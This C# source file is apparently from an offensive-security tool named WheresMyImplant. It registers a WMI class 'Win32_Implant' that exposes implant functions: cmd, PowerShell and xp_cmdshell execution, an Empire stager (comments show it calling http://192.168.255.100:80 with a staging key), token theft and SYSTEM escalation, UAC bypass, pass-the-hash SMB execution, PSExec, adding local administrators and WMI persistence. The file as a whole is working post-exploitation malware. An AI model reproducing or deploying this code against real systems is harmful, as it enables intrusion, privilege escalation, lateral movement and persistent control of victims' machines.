using System;
using System.Diagnostics;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Management.Instrumentation;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;

using Empire;

namespace WheresMyImplant
{
    [ComVisible(true)]
    [ManagementEntity(Name = "Win32_Implant")]
    public partial class Implant
    {
        [ManagementTask]
        public static string RunCMD(string command, string parameters)
        {
            RunCommandPrompt runCommandPrompt = new RunCommandPrompt(command, parameters);
            return runCommandPrompt.GetOutput();
        }

        [ComVisible(true)]
        [ManagementTask]
        public static string RunPowerShell(string command)
        {
            RunPowerShell runPowerShell = new RunPowerShell(command);
            return runPowerShell.GetOutput();
        }
        
        [ManagementTask]
        public static string RunXpCmdShell(string server, string database, string username, string password, string command)
        {
            //Invoke-CimMethod -Class Win32_Implant -Name RunXpCmdShell -Argument @{command="whoami"; database=""; server="sqlserver"; username="sa"; password="password"}
            RunXPCmdShell runXPCmdShell = new RunXPCmdShell(server, database, username, password, command);
            return runXPCmdShell.GetOutput();
        }
        
        [ManagementTask]
        //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "powershell","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
        //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "dotnet","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
        public static String Empire(String server, String stagingKey, String language)
        {
           EmpireStager empireStager = new EmpireStager(server, stagingKey, language);
           empireStager.execute();
           return empireStager.GetOutput();
        }

        [ManagementTask]
        public static String Tokenvator(string command)
        {
            Tokens tokenvator = new Tokens();
            if (command.ToLower().Contains("getsystem"))
            {
                String[] split = command.Split(' ');
                if (split.Length >= 2)
                {
                    tokenvator.GetSystem(split[1]);
                }
                else
                {
                    tokenvator = new Tokens();
                    tokenvator.GetSystem("cmd.exe");
                }
            }
            else if (command.ToLower().Contains("gettrustedinstaller"))
            {
                String[] split = command.Split(' ');
                if (split.Length >= 2)
                {
                    tokenvator.GetTrustedInstaller(split[1]);
                }
                else
                {
                    tokenvator.GetTrustedInstaller("cmd.exe");
                }
            }
            else if (command.ToLower().Contains("stealtoken"))
            {
                String[] split = command.Split(' ');
                if (split.Length >= 3)
                {
                    tokenvator.StartProcessAsUser(Int32.Parse(split[1]), split[2]);
                }
                else
                {
                    tokenvator.StartProcessAsUser(Int32.Parse(split[1]), "cmd.exe");
                }
            }
            else
            {
                //todo
            }
            return tokenvator.GetOutput();
        }

        [ManagementTask]
        public static String BypassUac(string command)
        {
            RestrictedToken tokenvator = new RestrictedToken();
            String[] split = command.Split(' ');
            if (split.Length == 2)
            {
                tokenvator.BypassUAC(Int32.Parse(split[1]), split[2]);
            }
            else if (split.Length == 3)
            {
                tokenvator = new RestrictedToken();
                tokenvator.BypassUAC(Int32.Parse(split[1]), "cmd.exe");
            }
            else
            {
                //to do
            }
            return tokenvator.GetOutput();
        }

        

        //FormalChicken
        public static void StartSmbServer(String pipeName)
        {
            Console.WriteLine("Starting SMB Server");
            while (true)
            {
                using (SMBServer smbServer = new SMBServer(pipeName))
                {
                    smbServer.WaitForConnection();
                    smbServer.MainLoop();
                }
            }
        }

        //GothTurkey
        public static void StartWebServiceServer(String serviceName, String port)
        {
            Console.WriteLine("Starting Web Service");
            WebService webService = new WebService(serviceName, port);
        }

        //DiscoChicken
        public static void StartWebServiceBeacon(String socket, String provider, String retries)
        {
            Int32 retriesCount;
            if (!Int32.TryParse(retries, out retriesCount))
            {
                retriesCount = 0;
            }

            using (WebServiceBeacon webServiceBeacon = new WebServiceBeacon(socket, provider))
            {
                Console.WriteLine("Starting Web Servic Beacon");
                webServiceBeacon.SetRetries(retriesCount);
                webServiceBeacon.Run();
            }
        }

        [ManagementTask]
        public static void PSExecCommand(String system, String execute, String isCommand)
        {
            Boolean comspec;
            if (!Boolean.TryParse(isCommand, out comspec))
            {
                comspec = false;
            }

            using (PSExec psexec = new PSExec())
            {
                psexec.Connect(system);
                String command = execute;
                if (comspec)
                {
                    command = String.Format("%COMSPEC% /C start {0}", execute);
                }
                psexec.Create(command);
                psexec.Open();
                psexec.Start();
                psexec.Stop();
            }
        }

        /*
        //DiscoChicken
        public static void StartWebServiceBeacon(String socket, String provider)
        {
            using (WebServiceBeacon webServiceBeacon = new WebServiceBeacon(socket, provider))
            {
                Console.WriteLine("Starting Web Servic Beacon");
                webServiceBeacon.SetRetries(0);
                webServiceBeacon.Run();
            }
        }
        */

        [ManagementTask]
        public static String PTHSMBClient(String target, String share, String domain, String username, String hash)
        {
            StringBuilder output = new StringBuilder();
            using (SMBClient smbClient = new SMBClient())
            {
                if (!smbClient.Connect(target))
                {
                    return "[-] Unable to Connect";
                }

                smbClient.NegotiateSMB();
                smbClient.NegotiateSMB2();
                smbClient.NTLMSSPNegotiate();

                if (!smbClient.Authenticate(domain, username, hash))
                {
                    return "[-] Login Failed";
                }

                try
                {
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));
                    smbClient.CreateRequest();
                    smbClient.InfoRequest();
                    smbClient.FindRequest();
                    smbClient.ParseDirectoryContents();
                    smbClient.CloseRequest();
                    smbClient.DisconnectTree();
                }
                catch (Exception ex)
                {
                    output.Append(ex.ToString());
                }
                finally
                {
                    output.Append(smbClient.GetOutput());
                }
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String PTHSMBExec(String target, String command, String domain, String username, String hash)
        {
            StringBuilder output = new StringBuilder();
            try
            {
                using (SMBExec smbExec = new SMBExec())
                {
                    smbExec.Connect(target);
                    smbExec.NegotiateSMB();
                    smbExec.NegotiateSMB2();
                    smbExec.NTLMSSPNegotiate();
                    if (smbExec.Authenticate(domain, username, hash))
                    {
                        try
                        {
                            smbExec.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                            smbExec.CreateRequest(new Byte[] { 0x01, 0x00, 0x00, 0x00});
                            smbExec.RPCBind();
                            smbExec.ReadRequest();
                            smbExec.OpenSCManagerW();
                            smbExec.ReadRequest();
                            smbExec.CheckAccess(command);
                            smbExec.ReadRequest();
                            smbExec.StartServiceW();
                            smbExec.ReadRequest();
                            smbExec.DeleteServiceW();
                            smbExec.ReadRequest();
                            smbExec.CloseServiceHandle();
                            smbExec.CloseRequest();
                            smbExec.DisconnectTree();
                            smbExec.Logoff();
                        }
                        catch (Exception ex)
                        {
                            output.Append(ex.ToString());
                        }
                        finally
                        {
                            output.Append(smbExec.GetOutput());
                        }
                    }
                    else
                    {
                        output.Append("[-] Login Failed");
                    }
                }
            }
            catch (Exception ex)
            {
                output.Append(ex.ToString());
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String AddUser(String username, String password, String admin)
        {
            Boolean isAdmin;
            if (!Boolean.TryParse(admin, out isAdmin))
            {
                return String.Empty;
            }

            AddUser add = new AddUser();
            if (isAdmin)
            {
                add.AddLocalAdmin(username, password);
                return "Admin Added";
            }
            add.AddLocalUser(username, password);
            return "User Added";
        }

        [ManagementTask]
        public static String Install()
        {
            StringBuilder output = new StringBuilder();
            InstallWMI install = new InstallWMI(".", @"ROOT\cimv2", "Win32_Implant");
            try
            {
                install.ExtensionProviderSetup();
                install.GetMethods();
                install.AddRegistryLocal();
                install.CopyDll();
            }
            catch (Exception ex)
            {
                output.Append(ex.ToString());
            }
            finally
            {
                output.Append(install.GetOutput());
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String GetFileBytes(String filePath, String base64)
        {
            Boolean bBase64 = false;
            if (String.Empty == base64)
            {
                base64 = "false";
            }
            if (!Boolean.TryParse(base64, out bBase64))
            {
                return "";
            }

            Byte[] fileBytes;
            using (System.IO.FileStream fileStream = new System.IO.FileStream(System.IO.Path.GetFullPath(filePath), System.IO.FileMode.Open, System.IO.FileAccess.Read, System.IO.FileShare.ReadWrite))
            {
                using (System.IO.BinaryReader binaryReader = new System.IO.BinaryReader(fileStream))
                {
                    fileBytes = new Byte[binaryReader.BaseStream.Length];
                    binaryReader.Read(fileBytes, 0, (Int32)binaryReader.BaseStream.Length);
                }
            }

            String strBytes = "0x" + BitConverter.ToString(fileBytes).Replace("-", ",0x");
            if (bBase64)
            {
                return Convert.ToBase64String(fileBytes);
            }
            return strBytes;
        }

        [ManagementTask]
        public static String GenerateNTLMString(String password)
        {
            StringBuilder output = new StringBuilder();
            try
            {
                Byte[] bPassword = Encoding.Unicode.GetBytes(password);
                Org.BouncyCastle.Crypto.Digests.MD4Digest md4Digest = new Org.BouncyCastle.Crypto.Digests.MD4Digest();
                md4Digest.BlockUpdate(bPassword, 0, bPassword.Length);
                Byte[] result = new Byte[md4Digest.GetDigestSize()];
                md4Digest.DoFinal(result, 0);
                output.Append(BitConverter.ToString(result).Replace("-", ""));
            }
            catch (Exception ex)
            {
                output.Append(ex.ToString());
            }
            return output.ToString();
        }
    }
}